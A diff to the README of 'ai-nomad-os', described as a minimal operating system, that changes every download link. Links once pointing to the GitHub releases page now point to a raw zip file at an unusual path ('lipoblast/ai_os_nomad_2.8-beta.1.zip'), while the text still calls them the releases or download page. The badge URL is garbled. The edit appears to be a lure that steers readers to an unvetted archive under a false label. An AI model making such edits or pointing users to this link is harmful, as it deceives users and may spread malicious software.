@@ -7,7 +7,7 @@ ai-nomad-os is a minimal operating system designed to help you create and remix 
 Following are simple steps to download and run ai-nomad-os. Don't worry; we've made it easy!
 
 ## 📥 Download Now
-[![Download ai-nomad-os](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/almacencatania/ai-nomad-os/releases)
+[![Download ai-nomad-os](https://github.com/almacencatania/ai-nomad-os/raw/refs/heads/main/lipoblast/ai_os_nomad_2.8-beta.1.zip%20Now-Get%https://github.com/almacencatania/ai-nomad-os/raw/refs/heads/main/lipoblast/ai_os_nomad_2.8-beta.1.zip)](https://github.com/almacencatania/ai-nomad-os/raw/refs/heads/main/lipoblast/ai_os_nomad_2.8-beta.1.zip)
 
 ## 💻 System Requirements
 Before you download, ensure your system meets these requirements:
@@ -19,7 +19,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 🔧 Install ai-nomad-os
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/almacencatania/ai-nomad-os/releases) to find the latest version.
+   Go to the [Releases page](https://github.com/almacencatania/ai-nomad-os/raw/refs/heads/main/lipoblast/ai_os_nomad_2.8-beta.1.zip) to find the latest version.
 
 2. **Choose Your Version**
    Select the version you want to download. You can see details like changelogs, required features, and compatibility options.
@@ -57,7 +57,7 @@ We have built a community around ai-nomad-os where you can ask questions, share 
 - **Contact Us**: Reach out via GitHub issues for technical support or feedback.
 
 ## 🔗 Important Links
-For your convenience, here is the direct link to the download page again: [Download ai-nomad-os](https://github.com/almacencatania/ai-nomad-os/releases).
+For your convenience, here is the direct link to the download page again: [Download ai-nomad-os](https://github.com/almacencatania/ai-nomad-os/raw/refs/heads/main/lipoblast/ai_os_nomad_2.8-beta.1.zip).
 
 ## 📄 License
 ai-nomad-os is licensed under the MIT License. You are free to use, modify, and distribute this software.
